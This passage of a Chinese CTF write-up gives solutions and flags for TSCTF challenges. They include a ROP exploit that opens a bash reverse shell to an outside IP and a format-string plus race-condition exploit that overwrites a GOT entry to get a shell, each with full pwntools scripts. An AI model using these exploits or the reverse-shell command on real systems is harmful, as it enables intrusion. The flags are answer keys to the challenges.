> 出题思路

其实吧，这题想法源自于pwnable.tw的kidding，不过在某种程度上来说两题考点不一样，我这题主要考点是如何构造ROP去进行反连。

> 题解

这题如果稍微的百度一下就会发现，反连其实只要执行bash -c "/bin/bash -i >& /dev/tcp/ip/port 0>&1"这段命令就可以了，但是这题我使用了musl gcc编译，这个编译器会大量缩减编译出来程序的体积，会去除大量无用函数，这也就导致了，ROPgadget --binary kidding --ropchain 会失败，但是如果自己仔细研究ropchain的生成过程，你会发现，它实际上就是将输入的值迁移到bss段上，然后调用execv，这样何不自己去找rop gadget。

首先我们需要一个类似于mov qword ptr [reg], reg这样的指令：

```asm
0x0000000000400c01 : mov qword ptr [rdi + 0x20], rax ; xor eax, eax ; ret
```

然后如果想要任意写，就需要控制rax，rdi：

```assembly
0x0000000000400121 : pop rax ; ret
0x000000000040077c : pop rdi ; ret
```

有了以上三条rop gadget就可以实现内存数据任意写，接下来就是找可以执行execv的gadget：

```assembly
0x0000000000400740 : syscall ; ret
0x0000000000400121 : pop rax ; ret
0x00000000004005d5 : pop rdx ; ret
0x000000000040077c : pop rdi ; ret
0x0000000000400d64 : pop rsi ; pop r15 ; ret
```

有了以上五条指令，我们就可以控制syscall调用，然后执行execv("/bin/bash", ["-c", "/bin/bash -i >& /dev/tcp/ip/port 0>&1 "], NULL)就可以成功反连。

```python
from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'

import time, threading

class MyThread(threading.Thread):
	def __init__(self, func, libc, stack_addr):  
		threading.Thread.__init__(self) 
		self.func = func
		self.libc = libc
		self.stack_addr = stack_addr
		# self.ip = ip
		# self.port = port
  
	def run(self):  
		self.func(self.libc, self.stack_addr)  
  
def start_server(port):
	p=listen(port)
	p.wait_for_connection()
	# rop = ROP(libc)
	# rop.read(0, stack_addr + 0x200, 0x20)
	# rop.open(stack_addr + 0xa0, 0)
	# rop.read(1, stack_addr + 0x200, 0x40)
	# rop.write(0, stack_addr + 0x200, 0x40)
	# p.send((p32(0) + str(rop)).ljust(0xa0, '\x00') + './flagggggggggggggggg9gggggggggg9ggggggg9ggggggggggg99ggg\x00')
	p.interactive()

def WriteWhatWhere(addr, s):
	data = s.ljust(len(s) / 8 * 8 + 8, '\x00')
	shellcode = ''
	pop_rax = 0x0000000000400121			#pop rax ; ret
	pop_rdi = 0x000000000040077c			#pop rdi ; ret
	mov_qword = 0x0000000000400c01			#mov qword ptr [rdi + 0x20], rax ; xor eax, eax ; ret
	for i in range(len(data) / 8):
		shellcode += p64(pop_rdi) + p64(addr + i * 8 - 0x20)
		shellcode += p64(pop_rax) + data[i * 8 : i * 8 + 8]
		shellcode += p64(mov_qword)
	return shellcode

def WriteStr(addr, strs):
	shellcode = WriteWhatWhere(addr, '\x00'.join(strs))
	strs_addr = []
	s = 0
	for i in strs:
		strs_addr.append(addr + s)
		s = s + len(i) + 1
	return strs_addr, shellcode

def Syscall(rax, rdi = 0, rsi = 0, rdx = 0):
	syscall_addr = 0x0000000000400740		#syscall ; ret
	pop_rax = 0x0000000000400121			#pop rax ; ret
	pop_rdx = 0x00000000004005d5			#pop rdx ; ret
	pop_rdi = 0x000000000040077c			#pop rdi ; ret
	pop_rsi = 0x0000000000400d64			#pop rsi ; pop r15 ; ret
	shellcode = ''
	shellcode += p64(pop_rax) + p64(rax)
	shellcode += p64(pop_rdi) + p64(rdi)
	shellcode += p64(pop_rsi) + p64(rsi) + p64(0)
	shellcode += p64(pop_rdx) + p64(rdx)
	shellcode += p64(syscall_addr)
	return shellcode

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./kidding')
	else:
		p = remote(ip, port)
	bss_base = 0x00601000
	str_addr = bss_base + 0xa00
	argv_addr = bss_base + 0x900
	reverse_ip = '192.168.28.136'
	reverse_port = 8080
	bin_path = '/bin/bash'
	argv = ['/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/%s/%d 0>&1' % (reverse_ip, reverse_port)]
	shellcode = ''
	strs_addr, sc = WriteStr(str_addr, [bin_path] + argv)
	shellcode += sc
	shellcode += WriteWhatWhere(argv_addr, ''.join([p64(i) for i in strs_addr[1 :]]))
	shellcode += Syscall(59, strs_addr[0], argv_addr, 0)
	p.sendline('\x00' * 0x18 + shellcode)

	# shellcode += WriteWhatWhere(reverse_connect_addr, '/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')

	p.interactive()

if __name__ == '__main__':
	GameStart('192.168.28.137', 44444, 0)
```

> FLAG

TSCTF{Are_Y0u_Kidd1ng_me?}

### life_creed

> 出题思路

1. 程序会维护一个全局结构体,该结构体中有两个变量:name和life_creed，程序所有的功能均与此有关
 ```c
 struct student{
    char name[32];       
    char life_creed[256];                     
};             
struct student stu1;
 ```

2. modify_life_creed函数源码如下，在图中1处故意设置了一个很明显的fsb漏洞，但是对于printf 的参数stu1-->life_creed 通过图中2处的security_input函数进行了严格的过滤，过滤了格式化字符串利用中不可能不用的%和$号，导致如果通过正常的思路，这个fsb漏洞是“中看不中用的”
```c
void modify_life_creed()
{
	char *temp[256];

	puts("\nNow you are modifying your life_creed");
	printf("Your old life_creed is %s \n",stu1.life_creed);
	printf("Input your new life_creed: ");
	read(0,temp,256);
	if(security_input(temp))                   // --------------------------------  2
	{
		strncpy(stu1.life_creed, temp, 256);
	}
	lock = 0;                                 // vul: Premature termination of atomic operation

	puts("\nUpdating.....");
	sleep(3);                                  // --------------------------------- 3 
	printf("Modify successfully.Remember your life_creed is:");
	printf(stu1.life_creed);    //vul: fsb, use it to get shell             ------- 1
	return;
}
```

4. 函数modify_name源码如下，在下图中1处有一个变量溢出，可以通过name变量溢出覆盖到同一结构体中的life_creed，从而实现对life_creed内容的控制
```c
void modify_name()
{
	puts("\nNow you are modifying your name");
	printf("Your old name is %s \n",stu1.name);
	printf("Input your new name: ");
	//vul:bof. It can modify the value of life_creed when the modify_life_creed is sleeping 	
	read(0,stu1.name,256);                                    // ------------------- 1
	printf("\nModify successfully.Now your name is: %s",stu1.name);
	lock = 0;
	return;
}
```
5. modify_name和modify_life_creed函数均会新起一个单独的线程，其中因为锁变量使用不当，所以存在条件竞争漏洞，导致modify_life_creed线程中的变量stu1.creed，在通过security_input函数检查后，能够通过modify_name线程中变量溢出漏洞进行修改，进而可以控制触发fsb漏洞时的参数为任意的payload

6. 结合3、4、5中提到的三个漏洞，就可以做题了。首先利用条件竞争漏洞，当modify_life_creed线程执行sleep函数时，利用modify_name线程中的变量溢出修改 stu1.life_creed为fsb_payload， 当modify_life_creed 线程执行printf时，参数已经被控制为恶意的fsb_payload，即可绕过security_input函数对printf函数参数的check，实现对fsb漏洞的完整利用。通过两次fsb漏洞的利用，一次泄露libc地址，一次执行system函数，从而getshell。

   具体流程如下：

 - 选择3，运行modify_life_creed，输入要修改的一个新值为 puts_got，此时会修改stu1-->life_creed为输入的新值，并进入到sleep函数

 - 选择2，运行modify_name函数，在此read可读256个字节，远远超过了name变量长度，因此可以溢出修改life_creed变量的值为"%6$s"。当执行到 modify_life_creed线程的printf函数时，现场如下。因此就可以泄露得到libc的基址和system函数的地址

   ![1](/images/life_creed/1.png)

 - 重复以上两步过程，再一次利用条件竞争+格式化字符串漏洞，修改strcmp_got为第3步中泄露出来的system函数地址，现场如下：
     ![2](/images/life_creed/2.png)

 - 选择5，进入exit，其中会让我们输入一个字符串，使用strcmp函数和“yes”进行比较。strcmp函数已经被我们修改为system函数，其参数1来自于我们的输入，此时输入“/bin/sh”即可拿到shell
     ![3](/images/life_creed/3.png)

> 题解

```python
 #!/usr/bin/env python
 # Write by carter

from pwn import *

#init
context.log_level = 'debug'
context.clear(arch = 'amd64')

elf = ELF("./libc.so.6")
io = remote('10.112.108.77',2339)

def add(name ,life_creed):
	io.recvuntil('Your choice: ')
	io.sendline('1')
	io.recvuntil('name: ')
	io.sendline(name)
	io.recvuntil('life_creed: ')
	io.sendline(life_creed)

def modify_name(new_name):
	io.recvuntil('Your choice: ')
	io.sendline('2')
	io.recvuntil('new name: ')
	io.sendline(new_name)

def modify_creed(new_creed):
	#io.recvuntil('Your choice: ')
	io.sendline('3')
	io.recvuntil('new life_creed: ')
	io.sendline(new_creed)

def show_info():
	io.recvuntil('Your choice: ')
	io.sendline('4')

def _exit(content):
	#io.recvuntil('Your choice: ')
	io.sendline('5')
	io.recvuntil('this game?')
	io.sendline(content)

puts_got = 0x602030
strcmp_got = 0X602028

# 1-->  leak system_addr
add('carter','aaa')
modify_creed(p64(puts_got))
payload1 = 'a'*32+'%6$s\x00'
modify_name(payload1)

# 2--> calculate the system addr
io.recvuntil('Remember your life_creed is:')
puts_addr = u64(io.recv(6)+'\x00'*2)
system_addr = puts_addr - elf.symbols['puts'] + elf.symbols['system']
sh_addr = puts_addr - elf.symbols['puts'] + next(elf.search('/bin/sh'))
print 'puts_addr= {} , system_addr=  {} , sh_addr={}'.format(hex(puts_addr),hex(system_addr),hex(sh_addr))

# 3--> modify strcmp_got = system
auto_string = fmtstr_payload(6,{strcmp_got:system_addr},write_size='short')
address_string = auto_string[:32]
format_string = auto_string[32:]

payload2 = 'a'*32+ 'a'*32 + format_string
modify_creed(address_string)
modify_name(payload2)

# 4--> get shell
io.recvn(1000000,timeout=5).encode('hex')
_exit('/bin/sh\x00')

io.interactive()

```
> FLAG

TSCTF{3very0ne_sh01d_hAve_*_lif3_cr3eds}

## CODING

### ballgame

> 出题思路

出这道题完全是因为最近在微信小游戏《最强弹一弹》，出题的时候就想到了小时候的玩的游戏，所以就有了这道题。

> 题解

这道题限制了两个东西，第一个是时间（30s），第二个是步数（输入step的次数）。
这道题本身的碰撞规则并不复杂，但是要实现起来也是稍微有点麻烦，我这里提供的解决方案是尽可能的预测球的轨迹，只要不要让小球掉到挡板下面就行了。我这里提供了一个简单的版本，不过有点看人品，大家有兴趣的话可以继续优化。

```python
#!/usr/bin/env python
# coding=utf-8

from pwn import *

context.log_level = "DEBUG"

# p = process(['python', './ballgame.py'])
p = remote('10.112.108.77', 1112)
p.sendline('n')
p.sendline('y')


while True:
    try:
        p.recvline_contains("               ######################\n")
    except Exception:
        print p.recvine()
        break
    
    for i in range(10):
        line = p.recvline()
        if '@' in line:
            x = i
            if x == 9:
                y = line.find('@') - 16
                line = p.recvline()
                wall_y = line.find('=') - 16
                
                if wall_y != y:
                    p.sendline('move %d' % y)
                else: 
                    steps = (9 - lowest_point - 1) * 2
                    p.sendline('step %d' % steps)
            else:
                p.sendline('step %d' % (9 - x))

        elif '*' in line:
            lowest_point = i
```
> FLAG

tsctf{ballgame_is_interesting}

### zelda

> 出题思路

主要是沉迷荒野之息。。里面各种迷宫。

> 题解

一个迷宫的寻路算法(dfs,a*等等都行)，一个混合背包问题。
python题解如下:

``` python
import time
from pwn import *
s = remote('10.112.108.77',1111)
print s.recvuntil('no)')
#print s.recv(152)
s.sendline('yes')
print s.recvuntil('!')
print s.recvline()
maps=[]
for i in range(60):
    maps.append(s.recvuntil('\n')[:-1])
for i in maps:
    print i
openlist=[]
closelist=[]
parent = dict()
GHF = dict()
def findsmallest():
    global openlist
    global GHF
    result = (GHF[(openlist[0][0],openlist[0][1])][2],0)
    for i in range(len(openlist)):
        if result[0]>=GHF[(openlist[i][0],openlist[i][1])][2]:
            result=(GHF[(openlist[i][0],openlist[i][1])][2],i)
    return openlist[result[1]]
def action(node,maps,current):
    global openlist
    global closelist
    global parent
    global GHF
    if maps[node[0]][node[1]]=='#' or (node in closelist):
        pass
    else:
        if node not in openlist:
            openlist.append(node)
            parent[(node[0],node[1])]=(current[0],current[1])
            GHF[(node[0],node[1])]=(GHF[(current[0],current[1])][0]+1,abs(58-node[0])+abs(164-node[1]),GHF[(current[0],current[1])][0]+1+abs(58-node[0])+abs(164-node[1]))
        else:
            if GHF[(current[0],current[1])][0]+1<GHF[(node[0],node[1])][0]:
                parent[(node[0],node[1])]=(current[0],current[1])
                GHF[(node[0],node[1])]=(GHF[(current[0],current[1])][0]+1,node[1],GHF[(current[0],current[1])][0]+1+node[1])
openlist.append([1,0])
parent[(1,0)]=(1,0)
GHF[(1,0)]=(0,57+164,57+164)
while True: 
    current=findsmallest()
    openlist.remove(current)
    closelist.append(current)
    if current[0]-1>0:
        action([current[0]-1,current[1]],maps,current)
    if [58,164] in openlist:
        break
    if current[0]+1<59:
        action([current[0]+1,current[1]],maps,current)
    if [58,164] in openlist:
        break    
    if current[1]-1>0:
        action([current[0],current[1]-1],maps,current)
    if [58,164] in openlist:
        break
    if current[1]+1<165:
        action([current[0],current[1]+1],maps,current)
    if [58,164] in openlist:
        break
    #print current,GHF[(current[0],current[1])]
node = (58,164)
way = ''
while True:
    node1 = node
    node1 = parent[node1]
    if node1[0]<node[0]:
        way+='s'
    if node1[0]>node[0]:
        way+='w'
    if node1[1]<node[1]:
        way+='d'
    if node1[1]>node[1]:
        way+='a'
    node = node1
    #print node,'<-',
    if node == (1,0):
        break
way=way[::-1]
print s.recvuntil(':')
#print way
s.sendline(way)
maps=[]
print s.recvuntil(')')
s.sendline('1,1 2,2 3,0 4,2 5,0 6,6')
print s.recvuntil('!!')
print s.recvline()
print s.recvline()
```
> FLAG

TSCTF{Y0u_5re_a1Ready_a_Her0}



### gobang

> 出题思路

出题人在ACM集训时被要求一天编写一个五子棋程序与别人进行博弈，出题人写的程序非常辣鸡，于是想从网上找一个现成的程序来毒害大家。不过考虑到难度原因，没有开高级难度并且只要求下赢一轮即可。

> 题解

自己编写或从网上找到五子棋脚本与题目进行对下，有一定概率能赢即可。

> FLAG

TSCTF{Y0v_p1Ay_Go8ang_V3ry_W3!l}

### PartyOfGodZe

> 题目描述

派对计划在泽神家举办。我们需要带上所有参加派对的小伙伴以及泽神喜欢的食物前往派对。但是小伙伴和食物分布在各个城市，需要小伙伴以最快的方式带上所有的食物前往泽神家，或许你能帮到我们。
输出第一行N是所有方案的个数，接着每轮第一行是泽神家所在的城市X，参加派对人数H，泽神喜欢的食物个数F，道路的个数R，城市的个数C，接着R行，每行三个整数，分别是起始城市，终点城市，距离（相互连通）。接着H行，H个参加派对人所在的城市，接着F行是泽神喜欢的食物所在的城市。

> 出题思路

源自于之前参加的plaidctf中的Re: Plaid Party Planning。

> 题解

这题其实没有什么算法（应该是我太菜了，想不出来什么算法T_T），其实直接暴力搜就好了，主要是搜索姿势，已经考虑人要经过食物的问题。

```python
# from pwn import *
import random
import itertools
import sys
import signal

def GenerateMap(n, PathNumber, slen, elen):
	Map = []
	for i in range(n):
		Map.append([])
		for j in range(n):
			Map[i].append(-1)

	IsolatedPoint = range(1, n)
	ConnectedPoint = [0]
	for i in range(n - 1):
		IPindex = random.randint(0, len(IsolatedPoint) - 1)
		CPindex = random.randint(0, len(ConnectedPoint) - 1)
		Map[IsolatedPoint[IPindex]][ConnectedPoint[CPindex]] = Map[ConnectedPoint[CPindex]][IsolatedPoint[IPindex]] = random.randint(slen, elen)
		ConnectedPoint.append(IsolatedPoint[IPindex])
		del IsolatedPoint[IPindex]

	number = 0
	while 1:
		if number == PathNumber - n + 1:
			break
		s = random.randint(0, n - 1)
		e = random.randint(0, n - 1)
		while e == s:
			e = random.randint(0, n - 1)
		if Map[s][e] != -1:
			continue
		Map[s][e] = Map[e][s] = random.randint(slen, elen)
		number += 1

	return Map

def Floyd(n, mp):
	for i in range(n):
		for j in range(n):
			for k in range(n):
				if i != j and mp[i][k] > 0 and mp[k][j] > 0:
					if mp[i][j] < 0:
						mp[i][j] = mp[j][i] = mp[i][k] + mp[k][j]
					elif mp[i][k] + mp[k][j] < mp[i][j]:
						mp[i][j] = mp[j][i] = mp[i][k] + mp[k][j]
					else:
						pass
	return mp

def MinPath(FoodList, PeopleList, Map, PatyPoint):
	ans = -1
	for i in itertools.permutations(FoodList, len(FoodList)):
		s = 0
		b = PeopleList[0]
		for j in i:
			s += Map[b][j]
			b = j
		s += Map[b][PatyPoint]
		if ans < 0 or ans > s:
			ans = s
	return ans

def Solve(FoodList, PeopleList, Map, PatyPoint):
	fl = FoodList
	pl = PeopleList
	mp = Map
	if len(PeopleList) == 0:
		return 0
	if len(PeopleList) == 1:
		return MinPath(FoodList, PeopleList, Map, PatyPoint)
	ans = Solve(FoodList, PeopleList[1 :], Map, PatyPoint) + Map[PeopleList[0]][PatyPoint]
	for i in range(len(FoodList)):
		s = Solve(FoodList[ : i] + FoodList[i + 1 :], FoodList[i : i + 1] + PeopleList[1 : ], Map, PatyPoint) + Map[PeopleList[0]][FoodList[i]]
		if ans > s:
			ans = s
	return ans


def GameStart():
	signal.alarm(20)
	Round = random.randint(15, 20)
	print "Welcome to the Party of GodZe."
	print "The party plans to be held at Ze's home. We need to bring all the party partners and foods to the party. However, our partners and the food are distributed in various cities. We need to bring all the partners and food to Ze's home in the fastest way. Perhaps you can help us."
	print "The first row of output N is the number of all programs. Then the first row of each round is the city X where Ze's house is located, the number of our partiners H, the number of foods F, the number of roads R, and the number of cities C, then there are R lines, each line of three integers, respectively, is the starting city, the terminal city, the distance (interconnected). Then H line is the city where partner lives in, then F line is the city where Ze's favorite food at."
	print Round
	while Round !=0 :
		CityNum = random.randint(20, 30)
		PathNumber = random.randint(CityNum - 1, (CityNum - 1) * CityNum / 2)
		sLen = 30
		eLen = 60
		PeopleNum = random.randint(3, 10)
		FoodNum = random.randint(3, 5)

		PeopleList = []
		FoodList = []
		for i in range(PeopleNum):
			p = random.randint(0, CityNum - 1)
			while p in PeopleList:
				p = random.randint(0, CityNum - 1)
			PeopleList.append(p)

		for i in range(FoodNum):
			p = random.randint(0, CityNum - 1)
			while p in PeopleList or p in FoodList:
				p = random.randint(0, CityNum - 1)
			FoodList.append(p)
			
		PatyPoint = random.randint(0, CityNum - 1)
		while PatyPoint in PeopleList or PatyPoint in FoodList:
			PatyPoint = random.randint(0, CityNum - 1)

		print PatyPoint, PeopleNum, FoodNum, PathNumber, CityNum

		Map = GenerateMap(CityNum, PathNumber, sLen, eLen)
		for i in range(CityNum):
			for j in range(i + 1, CityNum):
				if Map[i][j] > 0:
					print '%d %d %d' % (i, j, Map[i][j])

		Map = Floyd(CityNum, Map)
		print '\n'.join(['%d' % _ for _ in PeopleList])
		print '\n'.join(['%d' % _ for _ in FoodList])
		sys.stdout.flush()
		ans = int(raw_input())
		if ans != Solve(FoodList, PeopleList, Map, PatyPoint):
			print "The answer is wrong!"
			sys.exit(-1)
		print "Answer right!"		
		Round -= 1
	print "TSCTF{chutirenpaolule}"
	


if __name__ == "__main__":
	GameStart()

```

> FLAG

TSCTF{chutirenpaolule}

